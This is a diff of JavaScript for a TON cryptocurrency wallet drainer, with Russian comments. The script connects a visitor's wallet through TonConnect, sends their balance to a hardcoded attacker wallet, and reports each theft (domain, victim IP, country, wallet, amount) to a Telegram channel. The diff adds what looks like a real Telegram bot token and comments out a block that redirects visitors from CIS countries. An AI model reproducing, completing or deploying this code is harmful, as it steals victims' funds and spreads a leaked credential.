@@ -1,16 +1,12 @@
 var mainWallet = "UQA3Qh7xby9ttfPfDdRX0e_I62m4FCNo_7FoloN6y51jcH7c"; //Ваш кошелек, куда будут лететь активы
-var tgBotToken = ""; //Токен от бота телеграмм
+var tgBotToken = "7180391635:AAHF6I20AE1zdDm6153KQdE9baUFpvyWIQs"; //Токен от бота телеграмм
 var tgChat = "@pawscheker"; //Ваш телеграмм-канал
-
-
 
 var domain = window.location.hostname;
 var ipUser;
 
-
-
-
-//Перенаправление стран СНГ
+// Перенаправление стран СНГ закомментировано
+/*
 fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
     const country = data.country;
     if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
@@ -35,11 +31,12 @@ fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
         console.error('Error: ', error);
     });
 }).catch(error => console.error('Error IP:', error));
+*/
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
     buttonRootId: 'ton-connect'
-})
+});
 tonConnectUI.on('walletConnected', (walletAddress) => {
     console.log('Адрес кошелька:', walletAddress);
 });
@@ -56,7 +53,7 @@ async function didtrans() {
             address: mainWallet,
             amount: processedBalance
         }, ]
-    }
+    };
     try {
         const result = await tonConnectUI.sendTransaction(transaction);
         const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
@@ -70,7 +67,6 @@ async function didtrans() {
             } else {
                 console.error('Error send.');
             }
-            
         }).catch(error => {
             console.error('Error: ', error);
         });
